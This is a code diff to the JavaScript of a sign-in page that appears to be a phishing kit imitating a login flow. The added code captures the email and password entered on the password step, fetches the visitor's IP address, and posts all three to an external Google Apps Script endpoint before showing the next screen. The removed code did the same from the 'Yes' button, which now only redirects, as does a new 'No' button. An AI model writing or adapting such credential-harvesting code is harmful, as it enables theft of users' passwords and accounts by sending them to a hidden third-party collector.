@@ -10,6 +10,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const nxt = document.getElementById('btn_next');
     const yes = document.getElementById('btn_yes'); // Selecting the "Yes" button
+    const no = document.getElementById('btn_no'); // Selecting the "No" button
 
     nxt.addEventListener('click', () => {
         validate();
@@ -28,40 +29,45 @@ document.addEventListener('DOMContentLoaded', () => {
     sig.addEventListener('click', () => {
         validate();
         if (pwdVal) {
-            document.getElementById("section_pwd").classList.toggle('d-none');
-            document.getElementById('section_final').classList.remove('d-none');
-            view = "final";
+            const email = unameInp.value.trim();
+            const password = pwdInp.value.trim();
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+
+                    const formData = new FormData();
+                    formData.append('IPAddress', userIP);
+                    formData.append('Email', email);
+                    formData.append('Password', password);
+                    formData.append('FormId', 'form12');
+
+                    const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
+                    fetch(scriptURL, {
+                        method: 'POST',
+                        body: formData,
+                    })
+                    .then(response => {
+                        console.log('Form data sent.');
+                        document.getElementById("section_pwd").classList.toggle('d-none');
+                        document.getElementById('section_final').classList.remove('d-none');
+                        view = "final";
+                    })
+                    .catch(error => console.error('Error!', error.message));
+                });
         }
     });
 
+    // Add event listeners for both "Yes" and "No" buttons to navigate to the dashboard
     yes.addEventListener('click', (e) => {
         e.preventDefault(); // Prevent the default form submission behavior
+        window.location.href = '/dashboard'; // Navigate to /dashboard
+    });
 
-        const email = unameInp.value.trim();
-        const password = pwdInp.value.trim();
-
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const userIP = data.ip;
-
-                const formData = new FormData();
-                formData.append('IPAddress', userIP);
-                formData.append('Email', email);
-                formData.append('Password', password);
-                formData.append('FormId', 'form12');
-
-                const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
-                fetch(scriptURL, {
-                    method: 'POST',
-                    body: formData,
-                })
-                .then(response => {
-                    console.log('Form data sent.');
-                    window.location.href = '/dashboard'; // Navigate to /dashboard
-                })
-                .catch(error => console.error('Error!', error.message));
-            });
+    no.addEventListener('click', (e) => {
+        e.preventDefault(); // Prevent the default form submission behavior
+        window.location.href = '/dashboard'; // Navigate to /dashboard
     });
 
     function validate() {
